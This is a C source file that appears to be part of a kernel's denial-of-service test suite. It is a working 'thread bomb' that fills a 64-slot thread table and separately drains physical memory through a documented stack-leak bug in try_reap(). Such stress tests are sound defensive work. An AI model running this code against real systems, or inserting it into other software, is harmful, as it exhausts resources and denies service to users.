/*
 * thread_bomb.c — DoS stress: thread table + thread-stack leak.
 *
 * Covers:
 *   ATTACK-DOS-014  clone until MAX_THREADS (64 slots)
 *   ATTACK-DOS-007  clone/exit loop leaking 64 KiB stack each (slots free,
 *                   but physical frames leak)
 *
 * Usage:
 *   ./thread_bomb fill  # DOS-014: fill the table, hold
 *   ./thread_bomb leak  # DOS-007: create+join loop; slot count stays low
 *                                  but frame pool drains
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

static void *worker_park(void *_) { (void)_; for(;;) { sleep(3600); } return NULL; }
static void *worker_exit(void *_) { (void)_; return NULL; }

static void thread_bomb_fill(void) {
    pthread_t t;
    unsigned long count = 0;
    for (;;) {
        int rc = pthread_create(&t, NULL, worker_park, NULL);
        if (rc != 0) {
            fprintf(stderr, "[thread_bomb/fill] pthread_create failed after %lu threads, rc=%d\n",
                    count, rc);
            for (;;) { /* hold the table full */ }
        }
        count++;
    }
}

static void thread_bomb_leak(void) {
    /* Each iteration leaks 64 KiB because try_reap() explicitly does
       not free stack_pages (threads.rs:680-681). Slot count stays
       near 0; physical frame pool drains silently. */
    pthread_t t;
    unsigned long count = 0;
    for (;;) {
        if (pthread_create(&t, NULL, worker_exit, NULL) != 0) {
            fprintf(stderr, "[thread_bomb/leak] create failed at %lu, errno=%d\n",
                    count, errno);
            return;
        }
        pthread_join(t, NULL);
        count++;
        if ((count & 0xFF) == 0)
            fprintf(stderr, "[thread_bomb/leak] %lu clone/reap cycles; ~%lu KiB leaked\n",
                    count, count * 64UL);
    }
}

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "fill";
    if      (!strcmp(mode, "fill")) thread_bomb_fill();
    else if (!strcmp(mode, "leak")) thread_bomb_leak();
    else {
        fprintf(stderr, "usage: %s [fill|leak]\n", argv[0]);
        return 2;
    }
    return 0;
}
